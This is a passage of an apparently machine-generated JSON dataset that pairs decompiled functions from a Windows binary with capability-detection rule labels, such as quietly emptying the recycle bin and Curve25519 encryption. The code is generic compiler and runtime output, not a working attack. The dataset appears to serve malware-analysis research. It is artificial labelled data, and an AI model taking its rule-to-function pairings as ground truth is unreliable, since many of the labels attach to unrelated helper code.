        "decompiled_code": "\nulong __fastcall fcn.00404924(uint param_1, uint8_t *param_2)\n\n{\n    uint16_t *puVar1;\n    int32_t *in_EAX;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    uint8_t uVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    \n    uVar3 = 0;\n    uVar6 = 0;\n    uVar4 = *param_2;\n    piVar2 = in_EAX;\n    do {\n        puVar1 = *(*piVar2 + -0x38);\n        if (puVar1 != NULL) {\n            uVar6 = uVar6 & 0xffff0000 | *puVar1;\n            piVar5 = puVar1 + 3;\n            do {\n                uVar3 = uVar3 & 0xffffff00 | *(piVar5 + 6);\n                if (*(piVar5 + 6) == uVar4) {\n                    while (((*(uVar3 + 6 + piVar5) ^ param_2[uVar3]) & 0xdf) == 0) {\n                        uVar3 = uVar3 - 1;\n                        if (uVar3 == 0) {\n                            piVar2 = *piVar5 + in_EAX;\n                            goto code_r0x00404970;\n                        }\n                    }\n                    uVar4 = *param_2;\n                    uVar3 = uVar3 & 0xffffff00 | *(piVar5 + 6);\n                }\n                piVar5 = uVar3 + 7 + piVar5;\n                uVar6 = uVar6 - 1;\n            } while (uVar6 != 0);\n        }\n        piVar2 = *(*piVar2 + -0x24);\n    } while (piVar2 != NULL);\ncode_r0x00404970:\n    return CONCAT44(in_EAX, piVar2);\n}\n",
        "token_count": 426
    },
    "00409944": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00409944(uint32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    bool bVar7;\n    \n    uVar2 = param_1 ^ 0xffffffff;\n    iVar1 = in_EAX + param_1 + -8;\n    iVar5 = param_2 + param_1 + -8;\n    iVar3 = uVar2 + 9;\n    if (iVar3 == 0 || SCARRY4(uVar2, 9) != iVar3 < 0) {\n        if (*(iVar3 + iVar1) != *(iVar3 + iVar5)) {\n            return 0;\n        }\n        uVar6 = iVar3 + iVar1 & 3;\n        iVar3 = (uVar2 + 0xd) - uVar6;\n        iVar4 = iVar3;\n        if (iVar3 == 0 || uVar2 + 0xd < uVar6) {\n            do {\n                if (*(iVar4 + iVar1) != *(iVar4 + iVar5)) {\n                    return 0;\n                }\n                if (*(iVar4 + 4 + iVar1) != *(iVar4 + 4 + iVar5)) {\n                    return 0;\n                }\n                iVar3 = iVar4 + 8;\n                if (iVar3 != 0 && SCARRY4(iVar4, 8) == iVar3 < 0) break;\n                if (*(iVar3 + iVar1) != *(iVar3 + iVar5)) {\n                    return 0;\n                }\n                if (*(iVar4 + 0xc + iVar1) != *(iVar4 + 0xc + iVar5)) {\n                    return 0;\n                }\n                bVar7 = SCARRY4(iVar3, 8);\n                iVar3 = iVar4 + 0x10;\n                iVar4 = iVar3;\n            } while (iVar3 == 0 || bVar7 != iVar3 < 0);\n        }\n    }\n    if (iVar3 < 5) {\n        if (*(iVar3 + iVar1) != *(iVar3 + iVar5)) {\n            return 0;\n        }\n        iVar3 = iVar3 + 4;\n    }\n    if (iVar3 < 7) {\n        if (*(iVar3 + iVar1) != *(iVar3 + iVar5)) {\n            return 0;\n        }\n        iVar3 = iVar3 + 2;\n    }\n    if ((iVar3 < 8) && (*(in_EAX + param_1 + -1) != *(param_2 + param_1 + -1))) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 607
    },
    "0042c9a4": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h_2\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0042c9a4(int32_t *noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6\n            , uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, \n            uint noname_13, uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, \n            uint noname_19, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t arg_ch_00;\n    uint32_t uVar2;\n    uint extraout_ECX;\n    uint8_t *puVar3;\n    int32_t unaff_ESI;\n    uint *in_FS_OFFSET;\n    int32_t var_ch;\n    uint8_t *var_4h;\n    int32_t var_4h_2;\n    int32_t var_8h_2;\n    uint var_10h_5;\n    uint var_10h_3;\n    uint var_18h;\n    uint var_1ch_2;\n    uint var_1ch;\n    uint var_10h;\n    uint var_8h;\n    uchar auStack180 [4];\n    int32_t iStack176;\n    uchar *puStack172;\n    int32_t iStack168;\n    uchar *puStack164;\n    uint arg_ch_01;\n    uint arg_10h;\n    uint uStack144;\n    uint uStack140;\n    uchar *puStack136;\n    int32_t iStack132;\n    uint8_t *puStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint *puStack108;\n    uint uStack104;\n    int32_t *piStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint32_t uStack84;\n    uchar *puStack80;\n    uint32_t uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uchar auStack52 [12];\n    uint var_30h_2;\n    uint var_30h;\n    uint uStack24;\n    uchar *puStack20;\n    uchar *puStack16;\n    uint32_t uStack12;\n    uint32_t var_10h_4;\n    uint var_10h_2;\n    \n    puStack108 = &fcn.0042c9a4::var_10h_2;\n    uStack12 = var_4h[1];\n    if (uStack12 != 0) {\n        puVar3 = var_4h + 3;\n        uVar2 = uStack12;\n        do {\n            uVar1 = *puVar3;\n            if ((uVar1 & 0x80) == 0) {\n                if (uVar1 == 0xc) {\n                    var_8h_2 = var_8h_2 + 0x10;\n                }\n                else {\n                    if ((uVar1 < 5) || (7 < uVar1)) goto code_r0x0042c9fb;\n                    var_8h_2 = var_8h_2 + 8;\n                }\n            }\n            else {\ncode_r0x0042c9fb:\n                var_8h_2 = var_8h_2 + 4;\n            }\n            puVar3 = puVar3 + 1;\n            uVar2 = uVar2 - 1;\n            unaff_ESI = var_8h_2;\n        } while (uVar2 != 0);\n    }\n    puStack128 = var_4h;\n    puStack20 = &stack0xffffffc0;\n    var_10h_4 = var_4h[2];\n    iStack132 = unaff_ESI;\n    for (uVar2 = var_10h_4; uVar2 != 0; uVar2 = uVar2 - 1) {\n        iStack132 = var_4h_2;\n    }\n    uStack76 = *var_4h;\n    if ((uStack76 == 4) && ((var_10h_4 = var_10h_4 + 1,  var_4h[3] == 9 || (var_4h[3] == 0xd)))) {\n        uStack76 = 8;\n    }\n    puStack16 = &stack0xffffffc0;\n    uStack68 = 0;\n    puStack72 = &stack0xffffffcc;\n    puStack80 = NULL;\n    uStack84 = 0x42ca4f;\n    fcn.0042c994();\n    uStack84 = uStack76;\n    uStack76 = var_10h_5;\n    uStack88 = puStack80;\n    uStack92 = 0x48fa44;\n    uStack96 = noname_2;\n    piStack100 = noname_0;\n    uStack104 = 0x42ca6b;\n    puStack80 = &stack0xffffffec;\n    arg_ch_00 = (**(*noname_0 + 0x18))();\n    if (arg_ch_00 == 0) {\n        return;\n    }\n    puStack172 = &stack0xffffffcc;\n    uStack104 = CONCAT31(extraout_ECX >> 8, 1);\n    puStack136 = &stack0xffffff94;\n    uStack116 = 0;\n    uStack120 = 0;\n    uStack124 = 0;\n    uStack140 = 0x42c979;\n    uStack144 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff70;\n    if (arg_ch_00 == -0x7ffdfff7) {\n        puStack136 = &stack0xffffff94;\n        puStack108 = &fcn.0042c9a4::var_10h_2;\n        fcn.004057d4();\n        arg_10h = uStack116;\n        fcn.004057d4();\n        puStack164 = 0x42c90c;\n        arg_ch_01 = uStack120;\n        fcn.004057d4();\n        puStack164 = 0x42c91b;\n        iStack168 = fcn.0042bc4c(var_30h, arg_ch_01, arg_10h, uStack24);\n        if (piStack100 != '\\0') {\n            puStack164 = 0x42c930;\n            fcn.004061e4();\n        }\n    }\n    else {\n        arg_10h = 0;\n        iStack168 = fcn.0042bb78(0, arg_ch_00);\n    }\n    if (var_ch != 0) {\n        iStack176 = iStack168;\n        if (iStack168 == 0) {\n            iStack176 = fcn.00405470();\n        }\n        puStack164 = &stack0xffffffc0;\n    // WARNING: Could not recover jumptable at 0x00404ee5. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**0x493014)(0xeedfade, 1, 7, &stack0xffffff4c);\n        return;\n    }\n    fcn.00404ec4();\n    *in_FS_OFFSET = arg_10h;\n    uStack144 = 0x42c980;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1688
    },
    "0046b7ec": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nvoid fcn.0046b7ec(void)\n\n{\n    uint in_EAX;\n    \n    fcn.00405584();\n    // switch table (8 cases) at 0x46b80e\n    switch(in_EAX) {\n    case 1:\n        fcn.00405584();\n        return;\n    case 2:\n        fcn.00405584();\n        return;\n    case 3:\n        fcn.00405584();\n        return;\n    case 4:\n        fcn.00405584();\n        return;\n    case 5:\n        fcn.00405584();\n        return;\n    case 6:\n        fcn.00405584();\n        break;\n    case 7:\n        fcn.00405584();\n        return;\n    }\n    return;\n}\n",
        "token_count": 170
    },
    "004100a0": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004100a0(uint arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x4100fa;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.004057d4();\n        fcn.00409f20();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x410101;\n    uStack20 = 0x4100f9;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 194
    },
    "0041010c": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041010c(uint arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x410166;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.004057d4();\n        fcn.0040b7b4();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x41016d;\n    uStack20 = 0x410165;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 194
    },
    "00410178": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410178(uint arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x4101d2;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.004057d4();\n        fcn.0040b788();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x4101d9;\n    uStack20 = 0x4101d1;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 196
    },
    "004101e4": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004101e4(uint arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x41023e;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.004057d4();\n        fcn.0040d23c();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x410245;\n    uStack20 = 0x41023d;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 194
    },
    "00410250": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410250(uint arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x4102aa;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.004057d4();\n        fcn.0040b7e0();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x4102b1;\n    uStack20 = 0x4102a9;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 197
    },
    "00411f50": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid fcn.00411f50(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack28 = 0x411ff3;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    fcn.00415154();\n    uVar3 = var_4h;\n    iVar2 = (***0x49277c)(var_4h, 0x400, 0, &var_8h);\n    if (iVar2 == -0x7ffdfffb) {\n        fcn.004057d4();\n        cVar1 = fcn.00409f20();\n        if (cVar1 == '\\0') {\n            var_8h = fcn.004131b0();\n            var_8h = var_8h & 0x7f;\n        }\n    }\n    else if (iVar2 != 0) {\n        fcn.00411288();\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.00405530(0x411ffa);\n    fcn.00405d28();\n    return;\n}\n",
        "token_count": 330
    },
    "00412954": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuint64_t fcn.00412954(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    uint uStack44;\n    uint uStack40;\n    int32_t iStack36;\n    uchar *puStack32;\n    uchar auStack24 [4];\n    uchar auStack20 [16];\n    \n    puStack32 = &stack0xffffffec;\n    iStack36 = 0x412964;\n    sub.oleaut32.dll_VariantInit();\n    iStack36 = 3;\n    uStack40 = 0;\n    uStack44 = 0x400;\n    iVar1 = (***0x492698)(&stack0xffffffe8);\n    if (iVar1 == 0) {\n        uVar3 = iStack36;\n    }\n    else {\n        iVar1 = (***0x492698)(&stack0xffffffd4);\n        if (iVar1 == 0) {\n            uVar3 = fcn.00403450();\n        }\n        else if (iVar1 == -0x7ffdfffb) {\n            uVar2 = fcn.004131b0();\n            uVar3 = uVar2 & 0x7f;\n        }\n        else {\n            fcn.00411288();\n            uVar3 = 0;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 299
    },
    "00412a00": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00412a00(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack52 = 0x412aee;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    fcn.00415154();\n    fcn.004057d4();\n    cVar1 = fcn.00409f40();\n    if (cVar1 == '\\0') {\n        iVar2 = (***0x49277c)(var_4h, 0x400, 0, &fcn.00412a00::var_14h);\n        if (iVar2 == 0) {\n            _var_10h = var_14h;\n        }\n        else {\n            iVar2 = (***0x492570)(var_4h, 0x400, 0, &fcn.00412a00::var_20h);\n            if (iVar2 == 0) {\n                _var_10h = fcn.00403450();\n            }\n            else if (iVar2 == -0x7ffdfffb) {\n                uVar3 = fcn.004131b0();\n                _var_10h = uVar3 & 0x7f;\n            }\n            else {\n                fcn.00411288();\n                _var_10h = 0;\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x412af5;\n    uStack52 = 0x412ae5;\n    fcn.00405530();\n    uStack52 = 0x412aed;\n    fcn.00405d28();\n    return;\n}\n",
        "token_count": 477
    },
    "004169b0": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004169b0(float arg_8h, float arg_ch, uint arg_10h)\n\n{\n    uint8_t uVar1;\n    int32_t *in_EAX;\n    uint8_t *puVar2;\n    int32_t in_EDX;\n    double *pdVar3;\n    code *var_8h;\n    uint var_4h;\n    \n    var_8h = *(in_EDX + 8);\n    puVar2 = fcn.004164d8();\n    uVar1 = *puVar2;\n    if ((var_8h & 0xff000000) == 0xff000000) {\n        pdVar3 = (var_8h & 0xffffff) + in_EAX;\n    // switch table (5 cases) at 0x4169f9\n        switch(uVar1 & 0x7f) {\n        case 0:\n            *pdVar3 = CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h));\n            break;\n        case 1:\n            *pdVar3 = CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h));\n            break;\n        case 2:\n            *pdVar3 = arg_8h;\n            *(pdVar3 + 4) = arg_ch;\n            *(pdVar3 + 1) = arg_10h;\n            break;\n        case 3:\n            *pdVar3 = ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)));\n            break;\n        case 4:\n            *pdVar3 = ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)) * *0x416ba4);\n        }\n    }\n    else {\n        if ((var_8h & 0xff000000) == 0xfe000000) {\n            var_8h = *(*in_EAX + var_8h);\n        }\n        if (*(in_EDX + 0x10) == -0x80000000) {\n    // switch table (5 cases) at 0x416a95\n            switch(uVar1 & 0x7f) {\n            case 0:\n                (*var_8h)();\n                break;\n            case 1:\n                (*var_8h)(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)));\n                break;\n            case 2:\n                (*var_8h)(arg_8h, arg_ch, arg_10h);\n                break;\n            case 3:\n                (*var_8h)(ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h))));\n                break;\n            case 4:\n                (*var_8h)(ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)) * *0x416ba4));\n            }\n        }\n        else {\n    // switch table (5 cases) at 0x416b28\n            switch(uVar1 & 0x7f) {\n            case 0:\n                (*var_8h)();\n                break;\n            case 1:\n                (*var_8h)(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)));\n                break;\n            case 2:\n                (*var_8h)(arg_8h, arg_ch, arg_10h);\n                break;\n            case 3:\n                (*var_8h)(ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h))));\n                break;\n            case 4:\n                (*var_8h)(ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)) * *0x416ba4));\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 815
    },
    "0041bb50": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nulong __cdecl fcn.0041bb50(uint arg_8h, uint arg_ch)\n\n{\n    ulong uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.0040a20c(arg_8h, arg_ch);\n    return uVar1;\n}\n",
        "token_count": 71
    },
    "0041dac4": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041dac4(uint param_1)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.0041eb40(param_1);\n    // switch table (14 cases) at 0x41dafa\n    switch(uVar1 & 0x7f) {\n    case 0:\n        fcn.00405584();\n        break;\n    default:\n        fcn.0041c9e8();\n        break;\n    case 7:\n        fcn.0041cfd8();\n        fcn.00405620();\n        fcn.00405a3c();\n        fcn.0041cfd8();\n        break;\n    case 8:\n        fcn.00405584();\n        break;\n    case 9:\n        fcn.00405584();\n        break;\n    case 0xd:\n        fcn.00405584();\n    }\n    return;\n}\n",
        "token_count": 202
    },
    "0041ec50": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid fcn.0041ec50(void)\n\n{\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    var_8h = 0;\n    uStack20 = 0x41edf5;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    uVar1 = fcn.0041eb40();\n    // switch table (22 cases) at 0x41ec87\n    switch(uVar1 & 0x7f) {\n    case 1:\n        fcn.0041eb9c(&stack0xfffffffc);\n        break;\n    case 2:\n        fcn.0041f05c();\n        break;\n    case 3:\n        fcn.0041f05c();\n        break;\n    case 4:\n        fcn.0041f05c();\n        break;\n    case 5:\n        fcn.0041f05c();\n        break;\n    case 6:\n    case 7:\n        fcn.0041e964();\n        break;\n    case 10:\n        fcn.0041ebc4(&stack0xfffffffc);\n        break;\n    case 0xb:\n        fcn.0041eb54();\n        break;\n    case 0xc:\n        fcn.0041ebc4(&stack0xfffffffc);\n        break;\n    case 0xe:\n        fcn.0041ebf4(&stack0xfffffffc);\n        break;\n    case 0xf:\n        fcn.0041f05c();\n        break;\n    case 0x10:\n        fcn.0041f05c();\n        break;\n    case 0x11:\n        fcn.0041f05c();\n        break;\n    case 0x12:\n        fcn.0041ebc4(&stack0xfffffffc);\n        break;\n    case 0x13:\n        fcn.0041f05c();\n        break;\n    case 0x14:\n        fcn.0041ebc4(&stack0xfffffffc);\n        break;\n    case 0x15:\n        fcn.0041f05c();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x41edfc;\n    uStack20 = 0x41edf4;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 560
    },
    "0041f26c": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid fcn.0041f26c(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    ulong uVar3;\n    uint in_stack_ffffffc8;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_1ch;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x41f47e;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    fcn.0041162c();\n    uVar2 = fcn.0041cfb4();\n    // switch table (22 cases) at 0x41f2ae\n    switch(uVar2 & 0x7f) {\n    case 0:\n    case 0xd:\n        cVar1 = fcn.0041eb40();\n        if (cVar1 != '\\r') {\n            fcn.00416314();\n        }\n        break;\n    default:\n        fcn.0040dba8();\n        fcn.00404ec4();\n        break;\n    case 2:\n        fcn.0041dbc0();\n        fcn.00415898();\n        break;\n    case 3:\n        fcn.0041dbc0();\n        fcn.00415898();\n        break;\n    case 4:\n        fcn.0041dbc0();\n        fcn.00415898();\n        break;\n    case 5:\n        fcn.0041d970();\n        fcn.00415a90();\n        break;\n    case 6:\n    case 0xc:\n        fcn.0041e9a0();\n        fcn.00415acc();\n        break;\n    case 8:\n    case 9:\n        fcn.0041eb40();\n        fcn.00415a68();\n        break;\n    case 10:\n        in_stack_ffffffc8 = 0x41f421;\n        fcn.0041f0a4(&stack0xfffffffc);\n        fcn.00411a58();\n        break;\n    case 0xf:\n        fcn.0041d9ec();\n        fcn.00415a90();\n        break;\n    case 0x10:\n        fcn.0041da30();\n        fcn.00415ab8();\n        break;\n    case 0x11:\n        fcn.0041da80();\n        fcn.00415aa4();\n        break;\n    case 0x12:\n    case 0x14:\n        fcn.0041ea5c();\n        fcn.00415af8();\n        break;\n    case 0x13:\n        uVar3 = fcn.0041dc2c();\n        in_stack_ffffffc8 = uVar3;\n        fcn.00415994(in_stack_ffffffc8, uVar3 >> 0x20);\n        break;\n    case 0x15:\n        fcn.0041d9a8();\n        fcn.00415a90();\n    }\n    *in_FS_OFFSET = in_stack_ffffffc8;\n    uStack48 = 0x41f485;\n    fcn.00411640();\n    fcn.00405d28();\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 742
    },
    "004322cc": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid fcn.004322cc(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    do {\n        iVar1 = *(in_EAX + 8 + (uVar2 & 0x7f) * 4);\n        if (iVar1 != 0) {\n            (***0x49250c)(iVar1);\n            *(in_EAX + 8 + (uVar2 & 0x7f) * 4) = 0;\n        }\n        uVar2 = uVar2 + 1;\n    } while (uVar2 != '\\x18');\n    return;\n}\n",
        "token_count": 153
    },
    "00432408": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00432408(uchar *param_1, uint32_t param_2)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    \n    *param_1 = 3;\n    uVar1 = param_2 - 2;\n    if (uVar1 < 7) {\n        *(param_1 + 4) = 1;\n        iVar2 = 2;\n    }\n    else if (uVar1 == 7) {\n        *(param_1 + 4) = 2;\n        iVar2 = 9;\n    }\n    else {\n        *(param_1 + 4) = 0;\n        iVar2 = 0;\n    }\n    *(param_1 + 8) = ((param_2 & 0x7f) - iVar2) + 1;\n    return;\n}\n",
        "token_count": 187
    },
    "00432444": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00432444(uchar *param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    *param_1 = 10;\n    // switch table (18 cases) at 0x43246f\n    switch(param_2 & 0xff) {\n    default:\n        *(param_1 + 4) = 0;\n        iVar1 = 0;\n        break;\n    case 2:\n        *(param_1 + 4) = 1;\n        iVar1 = 2;\n        break;\n    case 3:\n        *(param_1 + 4) = 2;\n        iVar1 = 3;\n        break;\n    case 4:\n    case 5:\n    case 6:\n    case 7:\n    case 8:\n    case 9:\n        *(param_1 + 4) = 3;\n        iVar1 = 4;\n        break;\n    case 10:\n    case 0xb:\n    case 0xc:\n    case 0xd:\n        *(param_1 + 4) = 4;\n        iVar1 = 10;\n        break;\n    case 0xe:\n    case 0xf:\n    case 0x10:\n    case 0x11:\n        *(param_1 + 4) = 5;\n        iVar1 = 0xe;\n    }\n    *(param_1 + 8) = ((param_2 & 0x7f) - iVar1) + 1;\n    return;\n}\n",
        "token_count": 332
    },
    "004324e0": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
